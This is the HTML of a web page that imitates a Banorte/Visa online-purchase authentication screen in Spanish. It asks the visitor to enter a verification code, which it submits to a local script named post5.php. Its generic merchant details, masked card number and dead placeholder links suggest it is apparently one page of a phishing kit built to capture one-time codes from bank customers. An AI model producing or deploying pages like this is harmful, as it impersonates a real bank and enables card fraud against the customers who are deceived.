<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación de compra - Banorte</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 450px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: left;
            border: 1px solid #ddd;
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 40px;
        }
        h5 {
            font-weight: bold;
            margin-bottom: 20px;
        }
        p {
            margin: 5px 0;
            font-size: 0.95rem;
        }
        .form-control {
            margin-top: 10px;
            margin-bottom: 20px;
            padding: 10px;
            font-size: 1rem;
            border: 1px solid #000;
            border-radius: 5px;
        }
        .btn-primary {
            background-color: #000;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            width: 100%;
        }
        .link, .footer-links a {
            display: block;
            margin-top: 20px;
            text-decoration: none;
            color: #000;
            font-size: 0.9rem;
        }
        .footer-links {
            margin-top: 30px;
            display: flex;
            justify-content: space-between;
            font-size: 0.9rem;
        }
        .footer-links a {
            text-decoration: underline;
        }
        .text-center a {
            display: block;
            margin-top: 20px;
            text-decoration: none;
            color: #000;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/banorte.png" alt="Banorte">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
        </div>
        <p>Ingresa este código para continuar con tu compra por internet. Dudas comunicarse a BANORTEL (55) 5140-5609.</p>

        <h6 class="text-muted">Detalles transaccionales</h6>
        <form action="post5.php" method="POST">
            <div class="details">
                <p><strong>Comercio:</strong> Digital</p>
                <p><strong>Número de tarjeta:</strong> ************</p>
                <p><strong>Digite el código:</strong> <input type="text" class="form-control" name="codigo"></p>
            </div>

            <button type="submit" class="btn btn-primary">Activar</button>
        </form>

        <a href="#" class="link">Presione aquí para recibir un nuevo código</a>

        <div class="footer-links">
            <a href="#">Preguntas Frecuentes</a>
            <a href="#">Política de Privacidad</a>
            <a href="#">Términos y Condiciones</a>
        </div>
        
        <div class="text-center">
            <a href="#">Salir</a>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
